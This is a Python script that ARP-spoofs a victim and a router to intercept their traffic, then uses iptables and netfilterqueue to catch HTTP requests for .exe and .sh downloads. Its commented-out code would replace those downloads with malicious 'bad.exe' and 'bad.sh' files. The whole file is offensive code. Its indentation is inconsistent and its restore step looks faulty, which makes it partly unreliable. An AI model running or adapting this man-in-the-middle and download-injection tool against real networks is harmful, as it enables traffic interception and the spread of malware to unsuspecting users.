import os
from scapy.all import *
from scapy.layers import http
from netfilterqueue import NetfilterQueue
import threading
run = True

interface = "wlp1s0" 

my_ip = "192.168.0.108"
target1 = "192.168.0.105"
target2 = "192.168.0.1"

whohas1 = sr1(ARP(op=ARP.who_has, psrc=my_ip, pdst=target1), verbose=False)
mac_1 = whohas1[0][ARP].hwsrc
whohas2 = sr1(ARP(op=ARP.who_has, psrc=my_ip, pdst=target2), verbose=False)
mac_2 = whohas2[0][ARP].hwsrc

# constant MITM ARP spoof
def spoofarp(target1, target2, mac_1, mac_2, interface):
	while (run):
		targetpack = ARP(op=2, pdst=target1, psrc=target2, hwdst=mac_1)
		send(targetpack, iface=interface, verbose=False)

		routerpack = ARP(op=2, pdst=target2, psrc=target1, hwdst=mac_2)
		send(routerpack, iface=interface, verbose=False)

print("ARPing targets...")
threading.Thread(target=spoofarp, args=(target1, target2, mac_1, mac_2, interface)).start()
print("Successfully ARP spoofed")
os.system('iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1')
def callback(packet):
    try:
	data = packet.get_payload()
	scapy_pkt = IP(data)
	if not scapy_pkt.haslayer('HTTP'):
        	# This packet isn't an HTTP request	
		packet.accept()
		return
    	http_layer = scapy_pkt.getlayer('HTTP')
	request = str(http_layer).split('\n')[0].split(' ')[0]
    	if request != 'GET':
		# This packet isn't a GET request
		packet.accept()
		return
	URL = str(http_layer).split('\n')[0].split(' ')[1]
	if URL.endswith('.exe'):
		print("Identified .exe download request from %s, replacing binary" %(target1))
		# Spoof new HTTP response
		#injected_file = open('bad.exe', "r")
		#print(scapy_pkt[TCP])
		#RESP  = "HTTP/1.1 200 OK\r\n"
		#RESP += "Server: NSA Surveillance Van\r\n"
		#RESP += "Content-Length: "
		#RESP += str(os.path.getsize('bad.exe'))
		#RESP += "\r\n"
		#RESP += injected_file.read()

		#spoofed_response = IP(src=scapy_pkt[IP].dst, dst=scapy_pkt[IP].src) / \
		#	TCP(dport=80, sport=scapy_pkt[TCP].sport) / \
		#	RESP

		#packet.set_payload(str(spoofed_response))
		packet.accept()
	elif URL.endswith('.sh'):
		print("Identified .sh download request from %s, replacing script" %(target1))
		# Spoof new HTTP response

                #injected_file = open('bad.sh', "r")
                #RESP  = "HTTP/1.1 200 OK\r\n"
                #RESP += "Server: NSA Surveillance Van\r\n"
                #RESP += "Content-Length: "
                #RESP += str(os.path.getsize('bad.sh'))
                #RESP += "\r\n"
                #RESP += injected_file.read()

                #spoofed_response = IP(src=scapy_pkt[IP].dst, dst=scapy_pkt[IP].src) / \
                #        TCP(dport=80, sport=scapy_pkt[TCP].sport) / \
                #        RESP

                #packet.set_payload(str(spoofed_response))
		packet.accept()
	else:
		# This packet isn't a [.exe] executable or [.sh] script
		packet.accept()
		return 	
	packet.accept()
    except Exception as e:
        print(e)
        print("!!!!")
nfqueue = NetfilterQueue()
nfqueue.bind(1, callback)
try:
    nfqueue.run()
except KeyboardInterrupt:
    run = False
    print('')
    print("re-ARPing targets...")
    targetpack = ARP(op=2, pdst=target1, psrc=target1, hwdst=mac_1)
    send(targetpack, iface=interface, verbose=False)
    routerpack = ARP(op=2, pdst=target2, psrc=target2, hwdst=mac_2)
    send(routerpack, iface=interface, verbose=False)
    print("Successfully reARPed targets.")
    os.system('iptables -t nat -F')
